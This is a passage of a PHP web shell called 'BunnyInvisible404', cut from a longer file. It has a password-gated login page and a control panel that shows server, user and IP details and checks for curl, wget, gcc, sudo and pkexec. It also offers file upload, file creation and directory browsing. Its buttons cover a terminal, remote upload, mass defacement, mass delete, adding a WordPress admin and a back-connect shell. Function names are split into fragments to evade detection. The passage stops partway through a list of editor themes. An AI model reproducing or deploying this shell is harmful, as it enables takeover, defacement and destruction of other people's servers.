                    padding-bottom: 3.5px;
                    padding-left: 3px;
                }

                .headerTerm span {
                    position: absolute;
                    left: 4%;
                    font-family: Monospace;
                    font-size: 10px;
                    font-weight: 500;
                }

                .headerTerm strong {
                    position: absolute;
                    left: 50%;
                    transform: translate(-50%);
                    font-family: Monospace;
                    font-size: 10px;
                    font-weight: 500;
                }

                @media screen and (min-width: 720px) {
                    .terminal {
                        width: 600px;
                        height: 350px;
                    }

                    .terminal .root {
                        font-size: 15px;
                    }

                    .terminal #app {
                        font-size: 15px;
                    }

                    .terminal .BunnyGanteng {
                        font-size: 15px;
                    }

                    .terminal .BunnyGanteng input[type=text] {
                        font-size: 15px;
                    }

                    .headerTerm {
                        width: 599px;
                        height: 20px;
                    }

                    .headerTerm img {
                        width: 20px;
                        height: 20px;
                        padding-top: 2px;
                    }

                    .headerTerm span {
                        font-size: 13px;
                    }

                    .headerTerm strong {
                        font-size: 13px;
                    }
                }

                @media screen and (min-width: 900px) {
                    .terminal {
                        width: 800px;
                        height: 450px;
                    }

                    .terminal .root {
                        font-size: 20px;
                    }

                    .terminal #app {
                        font-size: 20px;
                    }

                    .terminal .BunnyGanteng {
                        font-size: 20px;
                    }

                    .terminal .BunnyGanteng input[type=text] {
                        font-size: 20px;
                    }

                    .headerTerm {
                        width: 799px;
                        height: 25px;
                    }

                    .headerTerm img {
                        width: 25px;
                        height: 25px;
                        padding-top: 2.5px;
                    }

                    .headerTerm span {
                        font-size: 18px;
                    }

                    .headerTerm strong {
                        font-size: 18px;
                    }
                }

                @media screen and (max-width: 500px) {
                    .terminal {
                        width: 280px;
                        height: 150px;
                    }

                    .terminal .root {
                        font-size: 6.5px;
                        padding: 2px;
                    }

                    .terminal #app {
                        font-size: 6.5px;
                        padding: 2px;
                    }

                    .terminal .BunnyGanteng {
                        position: absolute;
                        top: 20%;
                        left: 2%;
                        font-family: monospace;
                        font-size: 10px;
                        color: #00ff00;
                    }

                    .terminal .BunnyGanteng input[type=text] {
                        background: transparent;
                        border: none;
                        outline: none;
                        font-family: monospace;
                        font-size: 10px;
                        color: #00ff00;
                    }

                    .terminal .BunnyGanteng input[type=text]:hover {
                        background: transparent;
                        border: none;
                        outline: none;
                    }

                    .terminal .BunnyGanteng input[type=text]:active {
                        background: transparent;
                        border: none;
                        outline: none;
                    }

                    .terminal .BunnyGanteng input[type=text]:focus {
                        background: transparent;
                        border: none;
                        outline: none;
                    }

                    .headerTerm {
                        width: 279px;
                        height: 8.5px;
                    }

                    .headerTerm img {
                        width: 8.5px;
                        height: 8.5px;
                        padding: 1.5px;
                        position: absolute;
                    }

                    .headerTerm span {
                        font-size: 6px;
                        left: 4%;
                    }

                    .headerTerm strong {
                        font-size: 6px;
                        right: 4%;
                    }
                }
            </style>
        </head>

        <body>
            <div class="terminal">
                <div class="headerTerm">
                    <img src="https://raw.githubusercontent.com/InvisibleBunny/Records/main/media/Bunny-Terminal.png"
                        alt="terminal" /><span>Terminal</span>
                    <strong>
                        $ .:<?= $Bunny_Name ?> LOGIN:. $
                    </strong>
                </div>
                <div class="root" style="color: #d00c0c"></div>
                <h1 id="app"></h1>
                <div class="BunnyGanteng">
                    <form action="" method="post">
                        <label for="passnya">Password</label>
                        <input type="text" id="passnya" name="passnya">
                        <button type="submit" name="btn-login" style="display: none;"></button>
                    </form>
                </div>
            </div>

            <script type="text/javascript">
                var root = document.querySelector(".root");
                var name = `
                                ╭──[root@BunnyInvisible404]<br>
                                ╰──➤
                                `;
                root.innerHTML = name;

                var app = document.getElementById("app");
                var typewriter = new Typewriter(app, {
                    loop: true,
                    delay: 150,
                });
                typewriter
                    .pauseFor(500)
                    .typeString("Welcome To <?= $Bunny_Name ?>")
                    .pauseFor(2000)
                    .deleteChars(26)
                    .typeString("Have a Nice Day!")
                    .pauseFor(2000)
                    .start();
            </script>
        </body>

        </html>
<?php
        exit();
    }
}

if (isset($_GET['path'])) {
    $path = $_GET['path'];
    chdir($_GET['path']);
} else {
    $path = BunnyCwd();
}
$path = str_replace("\\", "/", $path);
?>
<!doctype html>
<html>

<head>
    <title>
        $ .:<?= $Bunny_Name . ' ' . $_SERVER['HTTP_HOST'] ?>:. $
    </title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="bingbot" content="noindex, nofollow" />
    <meta name="description" content="$ .:<?= $Bunny_Name ?>:. $" />
    <link href="<?= $Bunny_Icons ?>" rel="shortcut icon" type="image/x-icon">
    <link rel="apple-touch-icon" href="<?= $Bunny_Icons ?>" />
    <!-- Font Api -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <!-- Poppins -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap" rel="stylesheet">
    <!-- Ubuntu Mono -->
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono&display=swap" rel="stylesheet">
    <!-- Source Code Pro -->
    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@500&display=swap" rel="stylesheet">
    <!-- Josefin Sans -->
    <link href="https://fonts.googleapis.com/css2?family=Josefin+Sans:wght@700&display=swap" rel="stylesheet">
    <!-- Trade Winds -->
    <link href="https://fonts.googleapis.com/css?family=Trade+Winds" rel="stylesheet">
    <!-- Javascript Library -->
    <script src='https://code.jquery.com/jquery-2.2.4.min.js'></script>
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://kit-pro.fontawesome.com/releases/v6.4.2/css/pro.min.css">
    <!-- Css Framework -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Flowbite -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.8.1/flowbite.min.css" rel="stylesheet" />
    <!-- For Text Editor -->
    <link rel="stylesheet" href="https://raw.githubusercontent.com/InvisibleBunny/Records/main/Bunny-Code/css/bunny.css">
    <style id="style2" type="text/css"></style>
    <link id="theme1" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/vs2015.min.css" rel="stylesheet" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js" type="text/javascript"></script>
    <!-- Css Manual -->
    <style>
        body {
            background-color: #0c192c;
            filter: contrast(200%) brightness(150%);
            color: rgba(255, 255, 255, 1)
        }

        tr:hover {
            background: rgba(36, 41, 59, 1);
        }

        .poppins {
            <?= $poppins ?>
        }

        .ubuntu-mono {
            <?= $ubuntuMono ?>
        }

        .source-code-pro {
            <?= $sourceCodePro ?>
        }

        .josefin-sans {
            <?= $josefinSans ?>
        }

        .trade-winds {
            <?= $tradeWinds ?>
        }

        .fs-xs {
            <?= $fsXs ?>
        }

        .fs-sm {
            <?= $fsSm ?>
        }

        .fs-lg {
            <?= $fsLg ?>
        }

        .fs-xl {
            <?= $fsXl ?>
        }

        .fs-xxl {
            <?= $fsXxl ?>
        }

        .fs-big {
            <?= $fsBig ?>
        }

        .fs-bigs {
            <?= $fsBigs ?>
        }

        .fs-bigest {
            <?= $fsBigest ?>
        }

        .fs-super {
            <?= $fsSuper ?>
        }

        /* Terminal Style */
        .terminal {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            font-family: "Noto Sans Mono", monospace;
            width: 400px;
            height: 250px;
            background: rgba(36, 38, 46, 1);
            border: 1px solid #eaeaea;
            animation: fadein 7s;
        }

        .terminal .root {
            position: absolute;
            padding: 5px;
            font-size: 10px;
            font-weight: 600;
            color: #f00;
        }

        .terminal form {
            width: auto;
            height: auto;
        }

        .terminal .command {
            position: absolute;
            left: 1%;
            font-family: monospace;
            font-size: 10px;
            color: #00ff00;
        }

        .terminal textarea {
            position: absolute;
            left: 1%;
            margin-top: 10px;
            padding: 0;
            width: 100%;
            height: 90px;
            font-family: monospace;
            font-size: 10px;
            color: #eaeaea;
            display: flex;
            flex-direction: row;
            flex-wrap: nowrap;
            overflow-x: hidden;
        }

        .terminal .command input[type=text] {
            background: transparent;
            border: none;
            outline: none;
            cursor: pointer;
            font-family: monospace;
            font-size: 10px;
            color: #00ff00;
        }

        .terminal .command input[type=text]:hover {
            border: none;
            outline: none;
        }

        .headerTerm {
            display: flex;
            flex-direction: row;
            align-items: center;
            width: 399px;
            height: 15px;
            background: #eaeaea;
        }

        .headerTerm img {
            width: 15px;
            height: 15px;
            padding-bottom: 3.5px;
            padding-left: 3px;
        }

        .headerTerm span {
            position: absolute;
            left: 4%;
            font-family: Monospace;
            font-size: 10px;
            font-weight: 500;
            color: #000;
        }

        .headerTerm strong {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            font-family: Monospace;
            font-size: 10px;
            font-weight: 500;
            color: #000;
        }

        @media screen and (min-width: 720px) {
            .terminal {
                width: 600px;
                height: 350px;
            }

            .terminal .root {
                font-size: 15px;
            }

            .terminal .command {
                font-size: 15px;
            }

            .terminal .command input[type=text] {
                font-size: 15px;
            }

            .headerTerm {
                width: 599px;
                height: 20px;
            }

            .headerTerm img {
                width: 20px;
                height: 20px;
                padding-top: 2px;
            }

            .headerTerm span {
                font-size: 13px;
            }

            .headerTerm strong {
                font-size: 13px;
            }
        }

        @media screen and (min-width: 900px) {
            .terminal {
                width: 800px;
                height: 450px;
            }

            .terminal .root {
                font-size: 20px;
            }

            .terminal .command {
                font-size: 20px;
            }

            .terminal .command input[type=text] {
                font-size: 20px;
            }

            .headerTerm {
                width: 799px;
                height: 25px;
            }

            .headerTerm img {
                width: 25px;
                height: 25px;
                padding-top: 2.5px;
            }

            .headerTerm span {
                font-size: 18px;
            }

            .headerTerm strong {
                font-size: 18px;
            }
        }

        @media screen and (max-width: 500px) {
            .terminal {
                width: 280px;
                height: 150px;
            }

            .terminal .root {
                font-size: 6.5px;
                padding: 2px;
            }

            .terminal .command {
                left: 1%;
                font-size: 10px;
            }

            .terminal .command input[type=text] {
                font-size: 5px;
            }

            .headerTerm {
                width: 279px;
                height: 8.5px;
            }

            .headerTerm img {
                width: 8.5px;
                height: 8.5px;
                padding: 1.5px;
                position: absolute;
            }

            .headerTerm span {
                font-size: 6px;
                left: 4%;
            }

            .headerTerm strong {
                font-size: 6px;
                right: 4%;
            }
        }
    </style>
</head>

<body>
    <header class="w-full flex flex-row">
        <div class="shell whitespace-nowrap py-2 px-2 flex flex-col">
            <a href="?hidden&path=<?= $path ?>/&Bunny&404" class="flex flex-row flex-nowrap"><img class="rounded rounded-xl" style="width: 5vh; height: 5vh;" src="<?= $Bunny_Logo ?>" alt="LOGO">
                <h1 class="<?= $txtWhite ?> mx-2 fs-super trade-winds"><?= $Bunny_Name ?></h1>
            </a>
            <span class="fs-xl poppins <?= $txtPurple ?>">KERNEL: <?= $kernel ?></span>
            <span class="fs-xl poppins <?= $txtPurple ?>">OS: <font class="ubuntu-mono <?= $txtGreen ?>"><?= $os ?>
                </font>
            </span>
            <span class="fs-xl poppins <?= $txtPurple ?>">SERVER: <font class="ubuntu-mono <?= $txtGreen ?>">
                    <?= $serverName ?></font></span>

            <span class="fs-xl poppins <?= $txtPurple ?>">USER: <font class="ubuntu-mono <?= $txtGreen ?>">
                    <?= $uid . '[ ' . $user . ' ]' ?></font> GROUP: <font class="ubuntu-mono <?= $txtGreen ?>">
                    <?= $gid . '[ ' . $group . ' ]' ?>
                </font></span>
            <span class="fs-xl poppins <?= $txtPurple ?>">PHP VERSION: <font class="ubuntu-mono <?= $txtGreen ?>">
                    <?= $phpVersion ?></font> PHP SERVER: <font class="ubuntu-mono <?= $txtGreen ?>"><?= $phpServer ?>
                </font> SAFE MODE:
                <?= $safeMode ?>
            </span>
            <span class="fs-xl poppins <?= $txtPurple ?> w-auto flex flex-row">SERVER IP:&nbsp;<font class="ubuntu-mono <?= $txtGreen ?> w-full flex flex-row items-center">
                    <?= $serverIp ?>&nbsp;<img style="width: 3vh; height: 2vh;" src="<?= $serverIpFlags ?>">
                </font></span>
            <span class="fs-xl poppins <?= $txtPurple ?> w-auto flex flex-row"">YOUR IP:&nbsp;<font class=" ubuntu-mono <?= $txtGreen ?> w-full flex flex-row items-center"><?= $userIp ?>&nbsp;<img style="width: 3vh; height: 2vh;" src="<?= $userIpFlags ?>"></font></span>
            <span class="fs-xl poppins <?= $txtPurple ?>">DATE TIME: <font id="time" class="ubuntu-mono <?= $txtGreen ?>"></font></span>
            <script>
                setInterval(() => {
                    var jam = document.getElementById("time");
                    var bulanArr = ["January", "February", "Maret", "April", "Mei", "Juni", "July", "Agustus", "September", "October", "November", "Desember"];
                    var waktu = new Date();
                    var tahun = waktu.getFullYear();
                    var bulan = bulanArr[waktu.getMonth()];
                    var tgl = waktu.getDate();
                    var hours = waktu.getHours();
                    var minutes = waktu.getMinutes();
                    var seconds = waktu.getSeconds();
                    jam.innerHTML = tgl + "-" + bulan + " " + tahun + " | " + hours + ":" + minutes + ":" + seconds;
                }, 1000);
            </script>
            <span class="fs-xl poppins <?= $txtPurple ?> flex flex-row flex-nowrap">
                <?= cekCurl() ?>&nbsp;<font class="<?= $txtWhite ?>">|</font>&nbsp;<?= cekWget() ?>&nbsp;<font class="<?= $txtWhite ?>">|</font>&nbsp;<?= cekPython2() ?>&nbsp;<font class="<?= $txtWhite ?>">|</font>&nbsp;<?= cekPython3() ?>&nbsp;<font class="<?= $txtWhite ?>">|</font>&nbsp;<?= cekPerl() ?>&nbsp;<font class="<?= $txtWhite ?>">|</font>&nbsp;<?= cekRuby() ?>&nbsp;<font class="<?= $txtWhite ?>">|</font>&nbsp;<?= cekGcc() ?>&nbsp;<font class="<?= $txtWhite ?>">|</font>&nbsp;<?= cekPkexec() ?>&nbsp;<font class="<?= $txtWhite ?>">|</font>&nbsp;<?= cekSudo() ?>
            </span>
            <span class="fs-xl poppins <?= $txtPurple ?>">DISABLE FUNCTIONS: <?= $cekFunc ?></span>
            <?php

            $paths = explode("/", $path);
            echo '<span class="fs-xl poppins ' . $txtPurple . '">PWD: ';
            foreach ($paths as $id => $pat) {
                echo "<a class='" . $txtBlue . "' href='?path=";
                for ($i = 0; $i <= $id; $i++) {
                    echo $paths[$i];
                    if ($i != $id) {
                        echo '/';
                    }
                }
                echo "'>$pat</a><span class='" . $txtPurple . "'>/</span>";
            }
            echo "&nbsp;&nbsp;<a class='" . $txtPurple . "' href='" . $_SERVER['PHP_SELF'] . "'>[ <font class='" . $txtRed . "'>Ho" . "me" . " " . "Sh" . "el" . "l</font> ]</a>";
            echo '</span>';
            ?>
        </div>
    </header>
    <?php
    if (isset($_POST['btn-upl'])) {
        $cou_ntfi_les = count($_FILES['file']['name']);
        for ($i = 0; $i < $cou_ntfi_les; $i++) {
            $fi_le_name = $_FILES['file']['name'][$i];
            $loc_ation = "" . $fi_le_name;
            $daolpu = "mo" . "ve_up" . "loa" . "ded_fi" . "le";
            if ($daolpu($_FILES['file']['tmp_name'][$i], $loc_ation)) {
                echo '<s' . 'cr' . 'ip' . 't>' . '
                    al' . 'er' . 't' . '("Upload Success");
                    </' . 's' . 'cr' . 'ip' . 't' . '>';
            } else {
                echo '<' . 'sc' . 'ri' . 'p' . 't' . '>
                    al' . 'e' . 'rt' . '("Upload Failed!");
                    <' . '/' . 'sc' . 'r' . 'ip' . 't' . '>';
            }
        }
    }
    ?>
    <form class="mx-2 flex flex-col border border-inherit px-2 py-4 rounded-lg w-max" action="" method="POST" enctype="multipart/form-data">
        <label class="block mx-2 fs-xl josefin-sans <?= $txtWhite ?>" for="upl">Upload File</label>
        <div class="mx-2 flex flex-row flex-nowrap w">
            <div><input type="file" class="font-bold <?= $txtWhite ?> border border-gray-300 rounded-lg cursor-pointer" name="file[]" id="file" multiple></div>
            <button type="submit" name="btn-upl" class="mx-2 font-bold bg-slate-800 hover:bg-slate-600 focus:outline-none focus:ring-4 focus:ring-gray-300 rounded-lg px-5 dark:bg-gray-800 dark:hover:bg-gray-700 dark:focus:ring-gray-700 dark:border-gray-700">Upload</button>
        </div>
        <div class="tools mt-4">
            <a href="?option&path=<?= $path ?>&terminal"><button type="button" name="terminal" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?= $txtWhite ?> border rounded-lg focus:ring-4 focus:ring-gray-600 dark:focus:ring-gray-700 hover:bg-gray-700"><i class="fa-duotone fa-square-terminal"></i>&nbsp;Terminal</button></a>
            <a href="?option&path=<?= $path ?>&newfolder"><button type="button" name="newfolder" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?= $txtWhite ?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i class="fa-duotone fa-folder-plus"></i>&nbsp;New Folder</button>
            <a href="?option&path=<?= $path ?>&newfiles"><button type="button" name="newfiles" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?= $txtWhite ?> hover:text-black border rounded-lg focus:ring-4 focus:ring-neutral-200 dark:focus:ring-neutral-400 hover:bg-neutral-400"><i class="fa-duotone fa-file-plus"></i>&nbsp;New Files</button>
            <a href="?option&path=<?= $path ?>&remoteupload"><button type="button" name="newfiles" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?= $txtWhite ?> border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-solid fa-upload"></i>&nbsp;Remote Upload</button>
            <a href="?option&path=<?= $path ?>&ziper"><button type="button" name="ziper" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?= $txtWhite ?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i class="fa-regular fa-file-zipper"></i>&nbsp;Ziper</button>
            <a href="?option&path=<?= $path ?>&Gass_Terus"><button type="button" name="gasterus" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?= $txtWhite ?> border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-solid fa-masks-theater"></i>&nbsp;Mass Pepes</button>
            <a href="?option&path=<?= $path ?>&mass_delete"><button type="button" name="massdelete" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?= $txtWhite ?> border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-solid fa-trash-can"></i>&nbsp;Mass Delete</button>
            <a href="?option&path=<?= $path ?>&addNewAdmin"><button type="button" name="addnewadmin" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?= $txtWhite ?> border rounded-lg focus:ring-4 focus:ring-blue-300 dark:focus:ring-blue-600 hover:bg-blue-600"><i class="fa-regular fa-users-medical"></i>&nbsp;Add WP Admin</button></a>
            <a href="?option&path=<?= $path ?>&backConnect"><button type="button" name="backConnect" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?= $txtWhite ?> border rounded-lg focus:ring-4 focus:ring-slate-300 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-sharp fa-light fa-chart-network"></i></i>&nbsp;Back Connect</button></a>
        </div>
    </form>
    <?php
    if (isset($_GET['newfolder'])) {
        if (isset($_POST['btn-newfolder'])) {
            $fo_lde_rna_me = htmlspecialchars($_POST['newfoldername']);
            $cr_ea_teF_old_er = "mk" . "d" . "ir";
            $is_d = 'i' . 's' . '_' . 'd' . 'ir';
            if (!$is_d($fo_lde_rna_me)) {
                if ($cr_ea_teF_old_er($fo_lde_rna_me)) {
                    echo '
                <' . 's' . 'cr' . 'ip' . 't' . '>
                    al' . 'e' . 'rt' . '("Success Create Folder")
                    history.back()
                    history.back()
                <' . '/' . 'sc' . 'ri' . 'p' . 't' . '>';
                } else {
                    echo '
                <' . 'sc' . 'r' . 'ip' . 't' . '>' . '
                    a' . 'le' . 'rt' . '("Failed to Create Folder")
                    history.back()
                <' . '/' . 'sc' . 'r' . 'ip' . 't' . '>
            ';
                }
            } else {
                echo '
                <' . 's' . 'cr' . 'ip' . 't' . '>
                    a' . 'le' . 'rt' . '("' . $fo_lde_rna_me . ' Already Exists")
                    history.back()
                <' . '/' . 'sc' . 'r' . 'ip' . 't' . '>
            ';
            }
        }
        echo '<form class="mx-2 my-2" action="" method="POST">';
        echo '<label class="block">
            <span class="block ' . $txtBlue . '">New Folder</span>
            <input type=""text" class="bg-white ' . $txtBlack . ' tracking-wider font-bold w-auto border border-slate-300 rounded-md py-2 pl-4 placeholder:text-gray-600 shadow-sm" placeholder="Foldername" name="newfoldername">
            </label>';
        echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
        echo '<button type="submit" name="btn-newfolder" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Create</button>';
        echo '</form>';
    }
    if (isset($_GET['newfiles'])) {
        if (isset($_POST['btn-newfiles'])) {
            $fi_len_a_me = htmlspecialchars($_POST['newfilesname']);
            $fi_lec_ont_ent = $_POST['filecontent'];
            $is_f = 'i' . 's' . '_' . 'fi' . 'le';
            if (!$is_f($fi_len_a_me)) {
                $fo = "fop" . "en";
                $o_pe_nF_ile = $fo("$fi_len_a_me", "w");
                if ($fi_lec_ont_ent) {
                    $fw = "fw" . "r" . "it" . "e";
                    $cr_eat_eFi_le = $fw($o_pe_nF_ile, $fi_lec_ont_ent);
                } else {
                    $cr_eat_eFi_le = $o_pe_nF_ile;
                }
                if ($cr_eat_eFi_le) {
                    echo '
                        <script>
                            alert("Success Create File")
                            history.back()
                            history.back()
                        </script>';
                } else {
                    echo '
                    <script>
                        alert("Failed to Create File")
                        history.back()
                    </script>
                ';
                }
            } else {
                echo '
                <script>
                    alert("' . $fi_len_a_me . ' Already Exists")
                    history.back()
                </script>
                ';
            }
        }
        echo '<form class="mx-2 my-2" action="" method="POST">';
        echo '<label class="block">
            <span class="block ' . $txtBlue . '">New Files</span>
            <input type=""text" class="bg-white ' . $txtBlack . ' tracking-wider font-bold w-auto border border-slate-300 rounded-md py-2 pl-4 placeholder:text-gray-600 shadow-sm" placeholder="Filename.txt" name="newfilesname">
            </label>';
        echo '
            <style type="text/css">
            @import url("https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400&display=swap");
    
            #divCodeWrapper {
                height: 80vh;
                width: 100%;
                overflow: hidden;
                border: 1px solid #a5a5a5;
                position: relative;
            }
    
            #preCode {
                height: 100%;
                width: 100%;
                position: absolute;
                top: 0;
                left: 0;
                overflow: hidden;
                padding: 0;
                margin: 0;
                background: #1b1b1b;
            }
    
                #preCode code {
                    padding: 15px;
                    height: calc(100% - 30px);
                    width: calc(100% - 30px);
                    font-family: "Roboto Mono", monospace;
                    font-weight: 400;
                    font-size: 12pt;
                    line-height: 150%;
                    overflow-y: scroll;
                    overflow-x: auto;
                }
    
            textarea {
                font-family: "Roboto Mono", monospace;
                font-weight: 400;
                font-size: 12pt;
                line-height: 150%;
                position: absolute;
                top: 0;
                left: 0;
                height: calc(100% - 30px);
                width: calc(100% - 30px);
                padding: 15px;
                z-index: 2;
                overflow-x: auto;
                overflow-y: scroll;
                white-space: nowrap;
                background-color: rgba(0,0,0,0);
                color: rgba(0,0,0,0);
                caret-color: white;
            }
        </style>
            <br><span>Theme:</span>
            <select id="selectStyle" class="bg-black">
                <option>a11y-dark.min.css</option>
                <option>a11y-light.min.css</option>
                <option>agate.min.css</option>
                <option>an-old-hope.min.css</option>
                <option>androidstudio.min.css</option>
                <option>arduino-light.min.css</option>
                <option>arta.min.css</option>
                <option>ascetic.min.css</option>
                <option>atom-one-dark-reasonable.min.css</option>
                <option>atom-one-dark.min.css</option>
                <option>atom-one-light.min.css</option>
                <option>brown-paper.min.css</option>
                <option>codepen-embed.min.css</option>
                <option>color-brewer.min.css</option>
                <option>dark.min.css</option>
                <option>default.min.css</option>
                <option>devibeans.min.css</option>
                <option>docco.min.css</option>
                <option>far.min.css</option>
                <option>felipec.min.css</option>
                <option>foundation.min.css</option>
                <option>github-dark-dimmed.min.css</option>
                <option>github-dark.min.css</option>
                <option>github.min.css</option>
                <option>gml.min.css</option>
                <option>googlecode.min.css</option>
                <option>gradient-dark.min.css</option>
                <option>gradient-light.min.css</option>
                <option>grayscale.min.css</option>
                <option>hybrid.min.css</option>
                <option>idea.min.css</option>
                <option>intellij-light.min.css</option>
                <option>ir-black.min.css</option>
                <option>isbl-editor-dark.min.css</option>
                <option>isbl-editor-light.min.css</option>
                <option>kimbie-dark.min.css</option>
                <option>kimbie-light.min.css</option>
                <option>lightfair.min.css</option>
                <option>lioshi.min.css</option>
                <option>magula.min.css</option>
                <option>mono-blue.min.css</option>
                <option>monokai-sublime.min.css</option>
                <option>monokai.min.css</option>
                <option>night-owl.min.css</option>
                <option>nnfx-dark.min.css</option>
                <option>nnfx-light.min.css</option>
                <option>nord.min.css</option>
                <option>obsidian.min.css</option>
                <option>panda-syntax-dark.min.css</option>
                <option>panda-syntax-light.min.css</option>
                <option>paraiso-dark.min.css</option>
                <option>paraiso-light.min.css</option>
                <option>pojoaque.min.css</option>
                <option>purebasic.min.css</option>
                <option>qtcreator-dark.min.css</option>
                <option>qtcreator-light.min.css</option>
                <option>rainbow.min.css</option>
                <option>routeros.min.css</option>
                <option>school-book.min.css</option>
                <option>shades-of-purple.min.css</option>
                <option>srcery.min.css</option>
                <option>stackoverflow-dark.min.css</option>
                <option>stackoverflow-light.min.css</option>
                <option>sunburst.min.css</option>
                <option>tokyo-night-dark.min.css</option>
                <option>tokyo-night-light.min.css</option>
                <option>tomorrow-night-blue.min.css</option>
                <option>tomorrow-night-bright.min.css</option>
                <option>vs.min.css</option>
                <option selected>vs2015.min.css</option>
                <option>xcode.min.css</option>
                <option>xt256.min.css</option>
                <option>base16/3024.min.css</option>
                <option>base16/apathy.min.css</option>
                <option>base16/apprentice.min.css</option>
                <option>base16/ashes.min.css</option>
                <option>base16/atelier-cave-light.min.css</option>
                <option>base16/atelier-cave.min.css</option>
                <option>base16/atelier-dune-light.min.css</option>
                <option>base16/atelier-dune.min.css</option>
                <option>base16/atelier-estuary-light.min.css</option>
                <option>base16/atelier-estuary.min.css</option>
                <option>base16/atelier-forest-light.min.css</option>
                <option>base16/atelier-forest.min.css</option>
                <option>base16/atelier-heath-light.min.css</option>
                <option>base16/atelier-heath.min.css</option>
                <option>base16/atelier-lakeside-light.min.css</option>
                <option>base16/atelier-lakeside.min.css</option>
                <option>base16/atelier-plateau-light.min.css</option>
                <option>base16/atelier-plateau.min.css</option>
                <option>base16/atelier-savanna-light.min.css</option>
                <option>base16/atelier-savanna.min.css</option>
                <option>base16/atelier-seaside-light.min.css</option>
                <option>base16/atelier-seaside.min.css</option>
                <option>base16/atelier-sulphurpool-light.min.css</option>
                <option>base16/atelier-sulphurpool.min.css</option>
                <option>base16/atlas.min.css</option>
                <option>base16/bespin.min.css</option>
                <option>base16/black-metal-bathory.min.css</option>
                <option>base16/black-metal-burzum.min.css</option>
                <option>base16/black-metal-dark-funeral.min.css</option>
                <option>base16/black-metal-gorgoroth.min.css</option>
                <option>base16/black-metal-immortal.min.css</option>
                <option>base16/black-metal-khold.min.css</option>
                <option>base16/black-metal-marduk.min.css</option>
                <option>base16/black-metal-mayhem.min.css</option>
                <option>base16/black-metal-nile.min.css</option>
                <option>base16/black-metal-venom.min.css</option>
                <option>base16/black-metal.min.css</option>
                <option>base16/brewer.min.css</option>
                <option>base16/bright.min.css</option>
                <option>base16/brogrammer.min.css</option>
                <option>base16/brush-trees-dark.min.css</option>
                <option>base16/brush-trees.min.css</option>
                <option>base16/chalk.min.css</option>
                <option>base16/circus.min.css</option>
                <option>base16/classic-dark.min.css</option>
                <option>base16/classic-light.min.css</option>
                <option>base16/codeschool.min.css</option>
                <option>base16/colors.min.css</option>
                <option>base16/cupcake.min.css</option>
                <option>base16/cupertino.min.css</option>
                <option>base16/danqing.min.css</option>
                <option>base16/darcula.min.css</option>
                <option>base16/dark-violet.min.css</option>
                <option>base16/darkmoss.min.css</option>
                <option>base16/darktooth.min.css</option>
                <option>base16/decaf.min.css</option>
                <option>base16/default-dark.min.css</option>
                <option>base16/default-light.min.css</option>
                <option>base16/dirtysea.min.css</option>
                <option>base16/dracula.min.css</option>
                <option>base16/edge-dark.min.css</option>
                <option>base16/edge-light.min.css</option>
                <option>base16/eighties.min.css</option>
                <option>base16/embers.min.css</option>
                <option>base16/equilibrium-dark.min.css</option>
                <option>base16/equilibrium-gray-dark.min.css</option>
                <option>base16/equilibrium-gray-light.min.css</option>
                <option>base16/equilibrium-light.min.css</option>
                <option>base16/espresso.min.css</option>
                <option>base16/eva-dim.min.css</option>
                <option>base16/eva.min.css</option>
                <option>base16/flat.min.css</option>
                <option>base16/framer.min.css</option>
                <option>base16/fruit-soda.min.css</option>
                <option>base16/gigavolt.min.css</option>
                <option>base16/github.min.css</option>
                <option>base16/google-dark.min.css</option>
                <option>base16/google-light.min.css</option>
                <option>base16/grayscale-dark.min.css</option>
                <option>base16/grayscale-light.min.css</option>
                <option>base16/green-screen.min.css</option>
                <option>base16/gruvbox-dark-hard.min.css</option>
                <option>base16/gruvbox-dark-medium.min.css</option>
                <option>base16/gruvbox-dark-pale.min.css</option>
                <option>base16/gruvbox-dark-soft.min.css</option>
                <option>base16/gruvbox-light-hard.min.css</option>
                <option>base16/gruvbox-light-medium.min.css</option>
                <option>base16/gruvbox-light-soft.min.css</option>
                <option>base16/hardcore.min.css</option>
                <option>base16/harmonic16-dark.min.css</option>
